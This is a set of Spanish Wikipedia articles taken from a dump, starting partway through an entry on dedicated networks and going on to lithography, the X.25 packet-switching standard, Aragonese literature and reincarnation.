Es una denominación que usualmente se reserva para redes de comunicaciones en las cuáles existe un único tipo de tráfico con objetivos de calidad establecidos explícitamente en el contrato entre el operador y el usuario. Normalmente, se utilizan para garantizar la disponibilidad de una cierta capacidad de transporte en ciertas condiciones a grandes usuarios de comunicaciones. Las tecnologías que soportan estas redes dedicadas dependen, en primer lugar, del tipo de información considerado: voz, vídeo (+ audio) o datos. También, y aunque originalmente se trate de redes separadas, de forma creciente se utilizan las mismas redes de transporte para cualquier otra comunicación a las que se incorporan los mecanismos adecuados para separar y priorizar el tráfico en cuestión.

La solución de redes permite a cada lugar individual encaminar datos en forma directa a un sitio anfitrión (host) secundario o cualquier otro lugar de la red del cliente, en lugar de transmitir por medio de la casa matriz como redes de arquitectura de interconexión radial.



</doc>
<doc id="6350" url="https://es.wikipedia.org/wiki?curid=6350" title="Litografía">
Litografía

La litografía es un procedimiento de impresión que consiste en trazar un dibujo, un texto o una fotografía en una piedra calcárea o una plancha metálica. Hoy casi en desuso, salvo para la obtención y duplicación de obras artísticas. Su creador fue el cajista alemán Aloys Senefelder en 1796. Etimológicamente, la palabra «litografía» proviene de los términos griegos "lithos", 'piedra', y "graphe", 'dibujo'.

En la técnica litográfica se utiliza la diferente adherencia entre sustancias hidrófilas e hidrófobas. Como el agua rechaza las tintas grasas, no se imprimen las zonas grasas aunque se encuentran en el mismo nivel, por ello las matrices litográficas se llaman también planográficas. 

En las técnicas manuales la formación de la matriz consiste en la adhesión de las tintas grasas y resinosas sobre el papel litográfico. Con estas tintas se traza el dibujo que se va a reproducir, el cual queda fijado mediante una solución de ácido nítrico y goma arábiga. La adhesión de la sustancia grasa produce un jabón calcáreo o metálico insoluble que constituye la base de señales de impresión. 

Sobre las partes que no se entintan, debido a una preparación especial la cual determina la formación de sales hidrófilas. En definitiva, sobre el plano de la matriz existen dos zonas contrapuestas gráficamente, las que generaran en la litografía el blanco (sales hidrófilas) y las que generaran el negro (tintas grasas y resinosas), que permiten la impresión, previas las operaciones de entintado y humidificación. De los fondos coloreados y conformados de acuerdo con las zonas claras del original hasta el empleo de tintas planas superpuestas, se pasó por las coloraciones por superposición.

Hacia 1835, el impresor francés Godofredo Engelmann llamó «cromolitografía» a la técnica de reproducción litográfica en colores. Se hacen tantos dibujos sobre papel o placa como tintas se consideren necesarias para la reproducción. El registro se obtiene realizando sobre el papel de cada color la correspondiente cruz de registro.

Para este tipo de impresión se utiliza una piedra caliza pulimentada sobre la que se dibuja la imagen a imprimir (de forma invertida) con una materia grasa, bien sea mediante lápiz o pincel. Este proceso se basa en la incompatibilidad de la grasa y el agua. Una vez la piedra humedecida, la tinta de impresión solo queda retenida en las zonas dibujadas previamente. 

Para cada color debe usarse una piedra distinta y, evidentemente, el papel tendrá que pasar por la prensa de imprimir tantas veces como tintas se empleen. En los carteles impresos mediante el sistema litográfico, tan frecuentes en la segunda mitad del siglo XIX y primeras décadas del siglo XX, se utilizaban quince, veinte o más tintas. Entre ellos son de destacar los que anunciaban las corridas de toros, los de las Semana Santa, y los diseñados durante la Guerra Civil española.

En una imagen litográfica las letras no pueden ser retiradas y reutilizadas en otro sitio: son únicas y precisan redibujarse, o copiarse, para cada uso.
El litógrafo podía reproducir una imagen «única» dibujada, combinando texto e imagen en complicadas disposiciones formales del color. El proceso cromolitográfico alcanzó su cima durante el siglo XIX. La mejora en los métodos del fotograbado (el grabado de una imagen fotográfica en una plancha metálica recubierta con una capa sensible y «mordida» después con ácido, obteniéndose así una imagen impresora en relieve) amenazó la supervivencia de la litografía, conduciendo a su progresivo declive a partir de la década de 1890.

Aunque este procedimiento fue extensamente usado con fines comerciales, la mayor parte de los grandes pintores de los siglos XIX y XX también lo emplearon ya que facilitaba obtener un cierto número de copias de un mismo trabajo: Picasso, Toulouse-Lautrec, Joan Miró, Piet Mondrian, Ramón Casas, Antoni Tàpies, Alphonse Mucha, Federico Castellón, Andy Warhol, etc.

Asimismo, reciben el nombre de "litografía", además del sistema de impresión, cada uno de los ejemplares obtenidos por este procedimiento así como el taller donde se realiza este tipo de trabajos.

Posteriormente, al aparecer las rotativas se comenzaron a emplear láminas flexibles de zinc o de aluminio, y más recientemente de plástico, en sustitución de las pesadas piedras litográficas. Con la incorporación de la fotomecánica, dichas planchas dejaron de ser dibujadas a mano, puesto que la sensibilización de su superficie permitía exactas reproducciones fotográficas.
Aunque de forma incorrecta, aún es frecuente denominar a las empresas de Artes Gráficas, como Litografías.




</doc>
<doc id="6354" url="https://es.wikipedia.org/wiki?curid=6354" title="Norma X.25">
Norma X.25

X.25 es un estándar ITU-T para redes de área amplia de conmutación de paquetes. Su protocolo de enlace, LAPB, está basado en el protocolo HDLC (publicado por ISO, y el cual a su vez es una evolución del protocolo SDLC de IBM). Establece mecanismos de direccionamiento entre usuarios, negociación de características de comunicación, técnicas de recuperación de errores. Los servicios públicos de conmutación de paquetes admiten numerosos tipos de estaciones de distintos fabricantes. Por lo tanto, es de la mayor importancia definir la interfaz entre el equipo del usuario final y la red. X.25 está orientado a la conexión y trabaja con circuitos virtuales tanto conmutados como permanentes. En la actualidad se trata de una norma obsoleta con utilidad puramente académica.

La norma X.25 es el estándar para redes de paquetes recomendado por CCITT, el cual emitió el primer borrador en 1974. Este original fue en 1976, en 1978, en 1980 y en 1984, para dar lugar al texto definitivo publicado en 1985. El documento inicial incluía una serie de propuestas sugeridas por Datapac, Telenet y Tymnet, tres nuevas redes de conmutación de paquetes.

La X.25 se define como la interfaz entre equipos terminales de datos y equipos de terminación del circuito de datos para terminales que trabajan en modo paquete sobre redes de datos públicas. Las redes utilizan la norma X.25 para establecer los procedimientos mediante los cuales dos ETD que trabajan en modo paquete se comunican a través de la red. Este estándar pretende proporcionar procedimientos comunes de establecimiento de sesión e intercambio de datos entre un ETD y una red de paquetes (ETCD). Entre estos procedimientos se encuentran funciones como las siguientes: identificación de paquetes procedentes de ordenadores y terminales concretos, asentimiento de paquetes, rechazo de paquetes, recuperación de errores y control de flujo. Además, X.25 proporciona algunas facilidades muy útiles, como por ejemplo en la facturación a estaciones ETD distintas de la que genera el tráfico.

Dentro de la perspectiva de X.25, una red opera en gran parte como un sistema telefónico. Una red X.25 se asume como si estuviera formada por complejos conmutadores de paquetes que tienen la capacidad necesaria para el enrutamiento de paquetes. Los anfitriones no están comunicados de manera directa a los cables de comunicación de la red, sino que cada anfitrión se comunica con uno de los conmutadores de paquetes por medio de una línea de comunicación serial. En cierto sentido la comunicación entre un anfitrión y un conmutador de paquetes X.25 es una red miniatura que consiste en un enlace serial. El anfitrión puede seguir un complicado procedimiento para transferir sus paquetes hacia la red.

El estándar X.25 no incluye algoritmos de enrutamiento, pero conviene resaltar que, aunque las interfaces ETD/ETCD de ambos extremos de la red son independientes una de otra, X.25 interviene desde un extremo hasta el otro, ya que el tráfico seleccionado se enruta al final. A pesar de ello, el estándar recomendado es asimétrico, ya que sólo se define un lado de la interfaz con la red (ETD/ETCD).

El modelo de interconexión de sistemas abiertos ha sido la base para la implementación de varios protocolos. Entre ellos, el conjunto de protocolos conocido como X.25 es probablemente el mejor conocido y el más ampliamente utilizado. X.25 fue establecido como una recomendación de la ITU-TS (Telecommunications Section de la International Telecommunications Union), una organización internacional que recomienda estándares para los servicios telefónicos internacionales. X.25 ha sido adoptado para las redes públicas de datos y es especialmente popular en Europa. X.25 es un protocolo que se basa en las primeras tres capas del modelo OSI.

La recomendación X.25 para el nivel de paquetes coincide con una de las recomendaciones del tercer nivel OSI. X.25 abarca el tercer nivel y también los dos niveles más bajos. La interfaz de nivel físico recomendado entre el ETD y el ETCD es el X.21. X.25 asume que el nivel físico X.21 mantiene activados los circuitos T(transmisión) y R(recepción) durante el intercambio de paquetes. Asume también, que el X.21 se encuentra en estado 13S(enviar datos), 13R(recibir datos) o 13(transferencia de datos). Supone también que los canales C(control) e I(indicación) de X.21 están activados. Por todo esto X.25 utiliza la interfaz X.21 que une el ETD y el ETCD como un "conducto de paquetes", en el cual los paquetes fluyen por las líneas de transmisión(T) y de recepción(R).

El nivel físico de X.25 no desempeña funciones de control significativas. Se trata más bien de un conducto pasivo, de cuyo control se encargan los niveles de enlace y de red.

Se utilizan conectores para enlaces digitales DB-15 para la norma X.21 y analógicos DB-25 para X.21 bis.

En X.25 se supone que el nivel de enlace es LAPB. Este protocolo de línea es un conjunto de HDLC. LAPB y X.25 interactúan de la siguiente forma: En la trama LAPB, el paquete X.25 se transporta dentro del campo I(información). Es LAPB el que se encarga de que lleguen correctamente los paquetes X.25 que se transmiten a través de un canal susceptible de errores, desde o hacia la interfaz ETD/ETCD. La diferencia entre paquete y trama es que los paquetes se crean en el nivel de red y se insertan dentro de una trama, la cual se crea en nivel de enlace.

Para funcionar bajo el entorno X.25, LAPB utiliza información(I), Receptor Preparado(RR), Rechazo(REJ), Receptor No Preparado(RNR), Desconexión(DSC), Activar Modo de Respuesta Asíncrono(SARM) y Activar Modo Asíncrono Equilibrado(SABM). 
Las respuestas utilizadas son las siguientes: Receptor Preparado(RR), Rechazo(REJ), Receptor No Preparado(RNR), Asentimiento No Numerado(UA), Rechazo de Trama(FRMR) y Desconectar Modo(DM).

Los datos de usuario del campo I no pueden enviarse como respuesta. De acuerdo con las reglas de direccionamiento HDLC, ello implica que las tramas I siempre contendrán la dirección de destino con lo cual se evita toda posible ambigüedad en la interpretación de la trama.

X.25 exige que LAPB utilice direcciones específicas dentro del nivel de enlace.

Tanto X.25 como LAPB utilizan números de envío(S) y de recepción(R) para contabilizar el tráfico que atraviesan sus respectivos niveles.

En LAPB los números se denotan como N(S) y N(R), mientras que en X.25 la notación de los números de secuencia es P(S) y P(R).

Es un protocolo de red, para la conmutación de paquetes.

El servicio de circuito virtual de X.25 ofrece dos tipos de circuitos virtuales: llamadas virtuales y circuitos virtuales permanentes. Una llamada virtual es un circuito virtual que se establece dinámicamente mediante una petición de llamada y una liberación de llamada. Un circuito virtual permanente es un circuito virtual fijo asignado en la red. La transferencia de los datos se produce como con las llamadas virtuales, pero en este caso no se necesita realizar ni el establecimiento ni el cierre de la llamada.



</doc>
<doc id="6359" url="https://es.wikipedia.org/wiki?curid=6359" title="Eisenstein">
Eisenstein

Eisenstein puede referirse a:

</doc>
<doc id="6360" url="https://es.wikipedia.org/wiki?curid=6360" title="Literatura en aragonés">
Literatura en aragonés

La lengua aragonesa -también llamada navarroaragonesa en su etapa medieval- no ha gozado, a lo largo de su historia, del prestigio literario con el que cuentan las otras lenguas romances de la península ibérica. 

Las "Glosas Emilianenses" (siglo X) son el primer testimonio escrito de la lengua aragonesa. Esta afirmación, que se opone a la que considera dichas glosas como castellanas, se sustenta en el análisis lingüístico, en los que muchos de los rasgos aparecen como claramente aragoneses. Es el caso de "-it-" resultante de "-ct-" (muito, feito), de la diptongación ante yod (uellos, tiengo), o de ciertas formas verbales, como las del verbo ser, y léxicas.

Pero no será hasta los siglos XII y XIII que el aragonés comenzará a tener mayor presencia en los documentos escritos. De este período, destacan el "Liber Regum" —primera historia general con desarrollo narrativo amplio en una lengua románica peninsular—, "Diez mandamientos" —tratado doctrinal destinado a confesores— y el "Vidal Mayor", obra jurídica donde aparecen compilados los fueros de Aragón. Textos como "Razón feita d'amor", el "Libre dels tres reys d'orient" o la "Vida de Santa María Egipciaca" presentan asimismo claros rasgos aragoneses. 

Ya en el siglo XIV, despunta la personalidad de Juan Fernández de Heredia, humanista, historiador y autor de la "Grant Crónica d'Espanya" y de la "Crónica de los Conquiridores", entre otras obras. Fue también quien se encargó de traducir al aragonés obras clásicas de la Antigüedad, como las "Vidas paralelas" de Plutarco. No obstante, el aragonés utilizado en estas obras presenta ya un claro polimorfismo, en el que aparecen castellanismos, catalanismos y cultismos. 

Más aragonesa se presenta la "Crónica de San Juan de la Peña", del mismo siglo, que incluye los versos prosificados de un cantar de gesta, el "Cantar de la Campana de Huesca", que dataría de fines del siglo XII o principios del XIII. También se realizan otras traducciones en esta época, como la del "Libro de las maravillas del mundo", libro de viajes de John Mandeville.

A partir del siglo XV, con la entrada de dinastías castellanas en Aragón, la lengua aragonesa sufrirá un progresivo desprestigio social que repercutirá en su literatura. Los versos de Eiximén Aznáriz serán lo más destacable de un siglo en el que los escritores aragoneses irán adoptando, en su mayoría, la nueva lengua de la corte y de las capas altas, el castellano. De este modo, el siglo XVI verá ya escritores aragoneses en lengua castellana, en la cual contará con autores de la talla de Baltasar Gracián o los hermanos Lupercio y Bartolomé Leonardo de Argensola. No obstante, estos siglos seguirán viendo una importante presencia del aragonés en la literatura aljamiada (escrita con grafía arábiga), como se aprecia en el "Poema de Yuçuf", estudiado por Menéndez Pidal y en muchos manuscritos y fragmentos de obras como "Las mil y una noches".

El teatro renacentista en Aragón es cultivado por Jaime de Huete, que escribió en la primera mitad del siglo XVI sus comedias "Tesorina" y "Vidriana", que incluían diálogos procedentes del habla popular con abundantes aragonesismos.

La lengua aragonesa, convertida cada vez más en una lengua de ámbito rural y familiar, adoptará en los siglos siguientes un carácter marcadamente popular. El siglo XVII contará con escritores aislados que, conscientes de las diferencias entre el habla del pueblo (aragonesa) y la adoptada por los escritores, mirarán de remedar aquélla para dar mayor realismo a sus obras. Será el caso de la abadesa Ana Abarca de Bolea, autora del poema "Albada al Nacimiento", y también de las "pastoradas" desde el siglo XVIII, en las que el "repatán" se expresa a menudo en aragonés. Joaquín Costa en marzo de 1879 publicó en el "Boletín de la Institución Libre de Enseñanza" una curiosa fórmula de pastorada ribagorzana: "Todos los días de festa, se les menchan lo disná. — En donas de Mon de Roda, no te hi vaigas á casá.- Los capellans anaban en la procesión en sombrero...".

Los siglos XIX y XX verán un cierto renacer de la literatura aragonesa, si bien su condición de idioma minorizado y falto de una seria referencia estándar hará que los escritores traten sus temas, a menudo localistas, en su propia variedad dialectal del aragonés. Así, en 1844 aparece en aragonés de Almudévar la novela "Vida de Pedro Saputo", de Braulio Foz. Ya en el siglo XX destacan: en cheso las comedias costumbristas de Domingo Miral y la poesía de Veremundo Méndez; en grausino, los escritos populares de Tonón de Baldomera; en estadillano, los versos de Cleto Torrodellas Español y los escritos, en verso y en prosa, de Cleto José Torrodellas Mur; en somontanés, los relatos costumbristas de Pedro Arnal Cavero, así como la popular novela de Juana Coscujuela, "A Lueca, istoria d'una mozeta d'o Semontano".

Los años posteriores a la dictadura suponen una revitalización de la literatura aragonesa, que ahora persigue un modelo más estandarizado o supradialectal. Numerosos estudios filológicos sobre las diversas hablas aragonesas ayudarán a adoptar una visión conjunta del idioma. 1977 será el año de la primera gramática escrita del aragonés, a cargo de Francho Nagore, quien ya había publicado el libro de poesía "Sospiros de l'aire" (1971). Un año después Ánchel Conte publica el poemario "No deixez morir a mía voz" y Eduardo Vicente de Vera publica "Garba y augua" (1976) y "Do s'amorta l'alba" (1977). A partir de los primeros años, crece el número de autores en lo que se dará en llamar aragonés literario o común (Francho Rodés, Chusé Inazio Nabarro, Óscar Latas Alegre, Francho Nagore, Chusé Raul Usón, María Pilar Benítez Marco, Ferrán Marín Ramos, Chusé Antón Santamaría Loriente, Ánchel Conte, Rafel Vidaller Tricas, Jesús de Jaime, etc.) por oposición al aragonés local o dialectal, que también se sigue cultivando en obras como las de Nieus Luzía Dueso en dialecto de Gistaín o "chistabín", José María Satué en el de Sobrepuerto, Máximo Palacio y Ricardo Mur Saura en el de Alto Gállego, Emilio Gastón en cheso, o las de Ana Tena y Toni Collada en ribagorzano. Asimismo crecerá en estos años el número de premios literarios que fomentan la creatividad literaria, como el Premio literario Villa de Siétamo, o el Premio de Relatos "Luis del Val".




</doc>
<doc id="6365" url="https://es.wikipedia.org/wiki?curid=6365" title="Reencarnación">
Reencarnación

La reencarnación es la creencia consistente en que la esencia individual de las personas (ya sea mente, alma, conciencia o energía) adopta un cuerpo material no solo una vez sino varias según va muriendo.

Esta creencia aglutina de manera popular diversos términos:

Todos estos términos aluden a la existencia de un alma o espíritu que viaja o aparece por distintos cuerpos, generalmente a fin de aprender en diversas vidas las lecciones que proporciona la existencia terrena, hasta alcanzar una forma de liberación o de unión con un estado de conciencia más alto.

El mismo fenómeno pero sin la creencia en un alma o espíritu:

La creencia en la reencarnación ha estado presente en toda la humanidad desde la antigüedad, en la mayoría de las religiones orientales, como el hinduismo, el budismo y el taoísmo, y también en algunas religiones africanas y tribales de América y Oceanía. En la historia de la humanidad, la creencia de que una persona fallecida volverá a vivir o aparecer con otro cuerpo (con una personalidad generalmente más evolucionada) ha sobrevivido incluso dentro de las religiones judeocristianas (cristianismo, judaísmo e islamismo). Son prácticamente las únicas que no la contemplan, pero han permanecido bajo la forma de diversas herejías y posturas no oficiales.

Todas las religiones llamadas dhármicas (con origen en el hinduismo) afirman que la reencarnación existe en un ciclo sin fin (rueda del karma), mientras las buenas acciones o métodos religiosos (buen fin o propósito o dharma) no sean suficientes para causar una liberación o cese de este ciclo.

Las religiones tradicionales de los diversos países de Asia (como la de los ancestros en China o el shinto en Japón) incorporan la reencarnación e influyen en gran manera en la devoción popular y la cultura y el folclore de estos países.

En la mitología de la religión brahmánica, al momento de la muerte del cuerpo, el alma o parte esencial abandona el cuerpo que se ha vuelto inservible, y es arrastrada por los iamadutas, los mensajeros sirvientes del dios Iama ―el encargado de juzgar el karma de todas las almas del universo―, para ser juzgada. En el Antiguo Egipto, sus actos eran sopesados contra el peso de una pluma.

Dependiendo de las acciones buenas o malas, el alma se reencarna en una existencia superior, intermedia o inferior. Esto incluye desde estados de existencia celestiales a infernales, siendo la vida humana un estado intermedio. Este incesante proceso recibe el nombre de samsara (‘vagabundeo’). Este término proviene del verbo sánscrito "samsrí:" ‘fluir junto’, ‘deambular’. Las religiones orientales se refieren a ese deambular (entretenimiento, codicia, acumulación de bienes, «matar el tiempo»...) como una vida sin propósito ni sentido.

Cada alma viaja por esta rueda, que abarca desde los dioses (devas) hasta los insectos. El sentido de la trayectoria de un alma dentro de este universo lo marca el contenido o sentido de sus actos. Según el hinduismo popular moderno, el estado en el que renace el alma está determinado por sus buenas o malas acciones (karma) realizadas en anteriores encarnaciones.

La calidad de la reencarnación viene determinada por el mérito o la falta de méritos que haya acumulado cada persona como resultado de sus actuaciones; esto se conoce como el karma de lo que el alma haya realizado en su vida o vidas pasadas. Las almas de los que hacen el mal, por ejemplo, renacen en cuerpos «inferiores» (como animales, insectos y árboles), o en estados aún más inferiores de vivencia infernal, o en vidas desgraciadas. El peso del karma se puede modificar con la práctica del yoga (aumento de la conciencia hasta los niveles más altos contemplativos y unitivos, según el grado y la modalidad de yoga), las buenas acciones (generosidad, conservar la alegría interior, responder bien por mal...), el ascetismo (privarse de lo que abotarga los sentidos e impide el crecimiento del alma, o impide la comunicación de los seres superiores con el individuo) y el ofrecimiento ritual (valor del agradecimiento y de la generosidad).

En el pensamiento religioso hinduista, la creencia en la transmigración aparece por primera vez en forma doctrinal en los textos religiosas indios llamados "Upanishad", que reemplazaron a los antiquísimos textos épicos no filosóficos llamados "Vedas" (entre el 1500 y el 600 a. C.). Los "Upanishad" fueron escritos entre el 500 a. C. y el 1600 d. C.

La liberación de la reencarnación en el hinduismo o liberación del "samsara", se consigue después de haber expiado o superado el peso de su karma, es decir, todas las consecuencias procedentes tanto de sus buenos como de sus malos actos. Este proceso es continuo hasta que el alma individual, Atman, está completamente evolucionada y se identifica o alcanza a Brahmá, el creador del mundo, en donde es salvado de la desgracia de la necesidad de más renacimientos. Esta identificación sucede mediante prácticas yóguicas y/o ascéticas. Luego de su última muerte sale del universo material y se funde en la Luz Divina (la refulgencia que emana del Brahman), con la creencia de que el alma individual "(atman)", y el alma universal (Brahman) son idénticas.

El jainismo es otra religión posterior al hinduismo y que surgió al mismo tiempo que el budismo. En el jainismo, las almas van recogiendo los frutos de sus buenas o malas acciones a través de sucesivas vidas. Cuando un jainista acumula suficiente buen karma, la pureza de su alma puede hacer que se reencarne en un "deva" o entidad semidivina, si bien esta situación no es permanente, por lo que los jainistas buscan una liberación definitiva.

La reencarnación es una creencia central de esta religión monoteísta, también parte de las englobadas bajo la palabra «hinduismo». Los sijes creen que el alma tiene que transmigrar de un cuerpo a otro como parte de su evolución. Esta evolución finalmente resultará en una unión con Dios mediante la purificación del espíritu. Si uno no realiza buenas acciones, el alma continúa reencarnándose para siempre. Desde la forma humana, si alguien realiza buenas acciones propias de un "gurmuja", entonces consigue la salvación con Dios. El alma se purifica mediante la recitación del "naam" (nombre de Dios), teniendo presente al "waheguru" (maestro espiritual) y siguiendo el camino del "gurmat".

El budismo surgió del hinduismo extendiéndose por los países orientales pero incluyó una gran reforma de sus puntos de vista hasta constituir una nueva religión. Tiene una noción distinta de la reencarnación, ya que por un lado la niega y por otro la afirma. Niega que exista una entidad en el individuo que pueda reencarnarse (ni alma, ni mente, ni espíritu) llamado anatman. Pero la afirma al decir que un nuevo individuo aparece en función de las acciones de uno anterior. Esta noción de reencarnación está más cerca de la palingenesia que de la transmigración.

Los budistas creen que mediante la realización del nirvana, el estado de total liberación, se logra también el cese del renacimiento. Dentro del budismo, la tradición tibetana utiliza muy frecuentemente la reencarnación, mientras que otras, como la tradición zen, la ignora en buena medida. Así, la tradición tibetana indica que ha de pasarse por el "bardo", que significa literalmente ‘estado intermedio’ o ‘estado de transición’, inmediatamente después de la muerte que duraría 49 días según el "Libro tibetano de los muertos".

Las diferencias de concepción seguramente solo provienen de distinto punto de evolución al que están refiriéndose, o a como conciben de distintas formas las posibles vías de evolución, así como a la influencia de las diferentes culturas. Más allá de tales aspectos «externos» ―aunque tratan de aspectos muy profundos― habría una esencia común real y objetiva, imposible de definir con la limitada palabra humana.

El budismo, a diferencia del cristianismo y de las religiones occidentales, no ha concebido nunca una noción semejante a la de «alma inmortal» sino que está próximo a la palingénesis. En el "Milinda-pañja" (‘preguntas del rey Milinda’), el sabio que instruye al rey plantea que existe una continuidad entre individuos (Yo soy tú y tú eres yo), pero que nada transmigra de uno a otro. Para comprender tales aparentes diferencias, habría que comprender el tema del tiempo y de la eternidad, y como desde la eternidad un macroser se separa en miles de millones de seres que son individuos que se creen separados entre sí (un libro que desarrolla el tema es "Habla Seth").

El "Milinda-pañja" ejemplifica la (aparente) paradoja con el símil de una antorcha que enciende a otra: «Ni la llama ni la antorcha son la misma, y sin embargo una existe a causa de la anterior».

El budismo plantea el nirvana como cese de la rueda de los nacimientos y las muertes. La escuela mahāyāna le añade además un significado más universalista, señalando que dicho ciclo se terminará cuando todos los seres vivos hayan logrado la iluminación.

Realmente lo que significa la reencarnación es el cambio en el transcurso de una misma vida. Es la evolución del yo. De la misma manera que el niño tiene que morir para dar lugar al adolescente con otros temores y otros deseos, las sucesivas reencarnaciones son cambios de perspectivas, de identidades, de verdades. Cambio de personalidad.
Todo esto se da en una misma vida. No hay reencarnación luego de la muerte física sino que en el transcurso de una misma vida es posible ir muriendo y renaciendo cada vez. Eso es vivir en real presente sin dependencia del tiempo ni de lo externo.

El shinto no se identificó a sí mismo como religión hasta la llegada del budismo a Japón, por lo que se vio influido en sus creencias. Siendo una mezcla de animismo y chamanismo, ya tenía presente la noción de reencarnación en forma de espíritus o almas que se relacionaban con los vivos. El shinto no tiene por tanto una soteriología clara de salvación, sino que los japoneses acuden para esto al budismo. Con la absorción de nociones budistas, el shinto convertirá a algunos de sus elementos míticos como los llamados "kami", en seres que se reencarnan con misiones diversas.

El taoísmo es una visión filosófica de la vida y la naturaleza, cuya faceta religiosa se caracteriza por métodos de vida, salud y meditación. Según el taoísmo, el tao es un principio supremo que impregna todo el universo, y por tanto su naturaleza es inmortal y eterna. La reencarnación existe ya que nada muere al estar todo lo vivo fluyendo con el tao. El taoísta no busca acabar con la reencarnación directamente, sino que sigue el camino del tao cuya culminación es volverse uno con el tao, y por tanto, conseguir la inmortalidad.

Diógenes Laercio describe una anécdota en la cual Pitágoras reconoce a un amigo fallecido en el cuerpo de un perro que había sido golpeado. Según Diodoro Sículo:

Platón es el principal exponente de la reencarnación en los griegos del que tenemos noticia. En la obra Fedro, escribe cómo el alma humana, de acuerdo al descubrimiento de la verdad que haya alcanzado, nacerá en un tipo de cuerpo o en otro. Estas existencias suponen pruebas para que las almas se perfeccionen. En "La República" explica cómo el mítico guerrero Er muere en el campo de batalla pero regresa al cabo de diez días, durante los cuales ve a las almas de los hombres esperando renacer.

En el siglo primero antes de Cristo Alejandro Polyhistor escribió:

Julio César registró que los druidas de la Galia, Bretaña e Irlanda, tenían a la trasmigración como una de sus doctrinas principales:

De manera similar al cristianismo, la reencarnación no es admitida como doctrina oficial, si bien aparece dentro de la Cábala. En el "Zohar" (2.99b) se lee: «Todas las almas están sujetas a la transmigración, y los hombres que no conocen los caminos del Señor, que sean bendecidos; ellos no saben que están siendo traídos delante del tribunal, tanto cuando entran en este mundo como cuando salen de él. Son ignorantes de las muchas transmigraciones y pruebas secretas que deben de pasar».

El cristianismo rechaza la reencarnación de manera mayoritaria por considerarla una doctrina contraria a la Biblia, difícilmente armonizable con la creencia en la resurrección, y ajena a la concepción salvífica que mantiene esta religión.

No obstante algunas denominaciones cristianas han aceptado la creencia en la reencarnación; entre ellas las denominadas espiritistas,quienes aseguran que tales doctrinas se pueden encontrar en la Biblia o en la tradición cristiana primitiva. Algunos movimientos dentro del cristianismo como el Nevo Pensamiento y los grupos vinculados a la denominada Nueva Era también aceptan la reencarnación.

Gran parte del gnosticismo, pero no en su totalidad, aceptó la doctrina de la, ya que se trataba de una creencia muy extendida en el contexto cultural de la época. Algunos de los Padres de la Iglesia discutieron la posibilidad de la reencarnación en sus escritos, rechazándola abiertamente. De entre ellos se pueden citar a Ireneo de Lyon, en su polémica contra los gnósticos, a Tertuliano, quien posiblemente fue el escritor que se dedicó con mayor profundidad el tema, al cual consagra ocho capítulos de su tratado "Sobre el alma" y a Orígenes el cual se muestra ambiguo en relación a la misma, algunas de sus expresiones parecen considerarla como aceptable, pero otras la rechazan.

El escritor Ian Stevenson afirmó haber investigado numerosos niños que afirmaban recordar una vida pasada. Llevó a cabo más de 2500 estudios de caso, en un período de 40 años, y publicó doce libros, incluyendo "Twenty Cases Suggestive of Reincarnation" (traducido al español como "Veinte casos que hacen pensar en la reencarnación") y "Where Reincarnation and Biology Intersect". Stevenson documentaba metódicamente las declaraciones de cada niño, y posteriormente encontraba la identidad de la persona fallecida con la que el niño se había identificado, y verificaba los hechos de la vida de la persona fallecida que coincidían con los recuerdos del niño. También encontró coincidencias de marcas y defectos de nacimiento con las heridas y cicatrices del fallecido, certificadas por historias clínicas, así como por fotografías de autopsias, en su libro "Reincarnation and Biology".

Stevenson buscó evidencias refutatorias y explicaciones alternativas a los informes, y pensaba que sus estrictos métodos descartaban todas las posibles explicaciones «normales» para los recuerdos de los niños.
Sin embargo, una gran mayoría de casos de reencarnación notificados por Stevenson se originaron en sociedades orientales, donde las religiones dominantes a menudo permiten el concepto de reencarnación. A raíz de este tipo de crítica, Stevenson publicó un libro sobre casos europeos del tipo reencarnación ("European Cases of the Reincarnation Type"). Otras personas que han llevado a cabo investigaciones sobre la reencarnación incluyen a Jim B. Tucker, Brian Weiss, y Raymond Moody.

Algunos escépticos, como Paul Edwards, han analizado muchos de estos relatos, llamándolos «anecdóticos».
Los escépticos sugieren que las afirmaciones de evidencia de la reencarnación se originan en el pensamiento selectivo y en los falsos recuerdos, que a menudo resultan de un sistema de creencias propio y de miedos básicos, y por lo tanto no se pueden tener en cuenta como evidencia empírica. Carl Sagan se refiere a los casos, aparentemente de las investigaciones de Stevenson, en su libro "El mundo y sus demonios" ("The Demon-Haunted World"), como un ejemplo de datos empíricos cuidadosamente recolectados, aunque rechazó, como mezquina, la reencarnación como una explicación de los relatos.

Una objeción a las afirmaciones sobre la reencarnación incluye el hecho de que la gran mayoría de la gente no recuerda vidas anteriores, y que no hay ningún mecanismo conocido por la ciencia moderna que permita a la personalidad sobrevivir a la muerte y viajar a otro cuerpo. Investigadores como Stevenson han reconocido esas limitaciones.

Otra de las objeciones a la reencarnación (que ya fue propuesta por Tertuliano), es que sería inconsistente con el crecimiento de la población. Dicha objeción ha sido refutada en la actualidad, siendo compatible el crecimiento de la población humana con la hipótesis de la reencarnación.

Durante la última década surgieron en Argentina grupos llamados "talleres de investigación sobre vidas pasadas" que publicaron, en 2017, unas cuestionadas conclusiones de sus trabajos.

Durante el siglo XX, Occidente ha sido más que permeable en lo tocante a la asimilación de conceptos religiosos-filosóficos provenientes de las antiguas colonias británicas y francesas de Asia, tal vez solo con fines de ensanchar el gusto popular por lo exótico y remoto, y legitimar indirectamente el expansionismo con el favor de la publicidad. No obstante, la situación vivencial de muchos europeos y estadounidenses, víctimas de angustiosas incertidumbres provocadas por el caos económico y las tensiones políticas que afectaban directamente las concepciones personales de la vida, propició nuevas maneras de afrontar los interrogantes sobre el sufrimiento y la existencia. Fue auspicioso para la aristocracia estadounidense y europea evitar las tensiones internas entre los espiritualistas en boga (que siempre han contado con sugestiva influencia, en especial entre los jóvenes) y la búsqueda política de consenso. La reencarnación desvió las injusticias sociales hacia la explicación metacientífica del karma, a tal punto que en el Reino Unido y en los Estados Unidos numerosas sectas orientalistas hacían énfasis en la neutralidad política y en la resignación ante los hechos nefastos de la vida social y personal, a favor de una búsqueda de la «verdad» en uno mismo con el fin de trascender a mejor existencia en una supuesta vida futura.

La noción de renacimiento también se encuentra entre los aborígenes de las praderas, en Estados Unidos: consideran que en la vida el hombre recorre el Camino Rojo o el Camino Negro y que al morir realiza un viaje cuya culminación en caso de haber seguido el primer sendero, consiste en cesar de nacer y morir y poder replegarse en el centro de todas las cosas. En cambio, una vida llena de afectos egoístas y equivocada, se hace merecedora de nuevos nacimientos para purgar su conducta.

